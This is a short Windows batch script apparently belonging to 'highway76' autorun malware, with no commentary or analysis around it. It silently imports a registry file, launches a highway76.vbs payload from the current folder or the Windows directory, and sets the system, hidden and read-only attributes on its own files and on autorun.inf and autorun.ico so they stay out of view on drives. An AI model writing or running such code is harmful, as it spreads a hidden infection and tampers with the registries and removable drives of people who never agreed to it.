@echo off
if exist .\highway76.reg regedit /s .\highway76.reg
if not "%1"=="" goto open
if exist highway76.vbs start WScript.exe highway76.vbs&exit
if exist %SYSTEMROOT%\highway76.vbs start WScript.exe %SYSTEMROOT%\highway76.vbs&exit
exit
:open
if not "%1"=="Open" goto next
start explorer .\
exit
:next
if "%1"=="+" attrib +s +a +h +r %2\highway76.*
if "%1"=="+" attrib +s +a +h +r %2\autorun.inf
if "%1"=="+" attrib +s +a +h +r %2\autorun.ico
:end
